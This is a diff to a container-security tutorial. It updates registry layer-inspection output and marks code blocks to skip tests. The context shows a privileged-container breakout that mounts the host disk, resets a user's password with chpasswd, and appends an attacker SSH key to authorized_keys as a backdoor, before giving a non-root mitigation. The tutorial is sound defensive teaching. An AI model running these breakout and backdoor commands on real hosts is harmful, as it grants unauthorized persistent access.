@@ -826,7 +826,7 @@ system layer first:
 
 ```{code-block} console
 ---
-emphasize-lines: 7-16
+emphasize-lines: 8-17
 ---
 $ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' example-secure | cut -f2 -d@)
 $ ldigest=$(curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | jq -r '.layers[0].digest')
@@ -834,17 +834,18 @@ $ echo $ldigest
 sha256:26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405
 $ curl -s -k https://localhost:443/v2/example-secure/blobs/$ldigest | sha256sum
 26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405  -
-$ curl -s -k https://localhost:443/v2/example-secure/blobs/$ldigest | tar -tvzf - | head
-drwxr-xr-x 0/0               0 2023-04-11 00:00 bin/
--rwxr-xr-x 0/0         1234376 2022-03-27 18:40 bin/bash
--rwxr-xr-x 0/0           43936 2020-09-24 08:36 bin/cat
--rwxr-xr-x 0/0           72672 2020-09-24 08:36 bin/chgrp
--rwxr-xr-x 0/0           64448 2020-09-24 08:36 bin/chmod
--rwxr-xr-x 0/0           72672 2020-09-24 08:36 bin/chown
--rwxr-xr-x 0/0          151168 2020-09-24 08:36 bin/cp
--rwxr-xr-x 0/0          125560 2020-12-10 13:23 bin/dash
--rwxr-xr-x 0/0          113664 2020-09-24 08:36 bin/date
--rwxr-xr-x 0/0           80968 2020-09-24 08:36 bin/dd
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$ldigest | tar -tvzf - > filesystem
+$ head filesystem
+lrwxrwxrwx 0/0               0 2023-11-20 00:00 bin -> usr/bin
+drwxr-xr-x 0/0               0 2023-09-29 20:04 boot/
+drwxr-xr-x 0/0               0 2023-11-20 00:00 dev/
+drwxr-xr-x 0/0               0 2023-11-20 00:00 etc/
+-rw------- 0/0               0 2023-11-20 00:00 etc/.pwd.lock
+-rw-r--r-- 0/0            3040 2023-05-25 15:54 etc/adduser.conf
+drwxr-xr-x 0/0               0 2023-11-20 00:00 etc/alternatives/
+-rw-r--r-- 0/0             100 2023-05-11 02:04 etc/alternatives/README
+lrwxrwxrwx 0/0               0 2022-06-17 15:35 etc/alternatives/awk -> /usr/bin/mawk
+lrwxrwxrwx 0/0               0 2022-06-17 15:35 etc/alternatives/awk.1.gz -> /usr/share/man/man1/mawk.1.gz
 ```
 
 What's particularly notable here is that we can actually start to investigate the files that are in this layer!
@@ -925,6 +926,9 @@ We'll start by running a standard Ubuntu container with some additional privileg
 to troubleshoot permissions issues:
 
 ```{code-block} console
+---
+class: skip-tests
+---
 $ docker run -it -e HOME --privileged ubuntu:20.04
 Unable to find image 'ubuntu:20.04' locally
 20.04: Pulling from library/ubuntu
@@ -938,6 +942,7 @@ example is on `/dev/nvme0n1p1`:
 
 ```{code-block} console
 ---
+class: skip-tests
 emphasize-lines: 5-7
 ---
 $ mount | grep '/dev/'
@@ -962,6 +967,7 @@ anything juicy, and maybe drop a quick backdoor for ourselves later:
 ```{code-block} console
 ---
 emphasize-lines: 1
+class: skip-tests
 ---
 $ ls -al /home # We can now see /home/ on the host filesystem
 total 4
@@ -975,6 +981,9 @@ $ echo 'hacker:newpassword' | chpasswd
 Finally, let's drop our public key into the current user's `~/.ssh/authorized_keys` file so there's another way back in.
 
 ```{code-block} bash
+---
+class: skip-tests
+---
 echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> ${HOME}/.ssh/authorized_keys
 exit
 exit
@@ -983,6 +992,9 @@ exit
 Back on the host, we can see evidence of the break-in:
 
 ```{code-block} console
+---
+class: skip-tests
+---
 $ tail -3 /etc/passwd
 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
 nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
@@ -997,6 +1009,9 @@ How do we prevent these sort of issues? Specific to this breakout, even if we co
 mitigate some of the impact by requiring that non-root users be used at runtime. For instance:
 
 ```{code-block} bash
+---
+class: skip-tests
+---
 docker run -it -u 1001 --privileged ubuntu:20.04
 ```
 
@@ -1005,6 +1020,7 @@ Now when we go to mount the host filesystem or run `chroot`, we get an error:
 ```{code-block} console
 ---
 emphasize-lines: 14
+class: skip-tests
 ---
 $ mount | grep '/dev/'
 devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
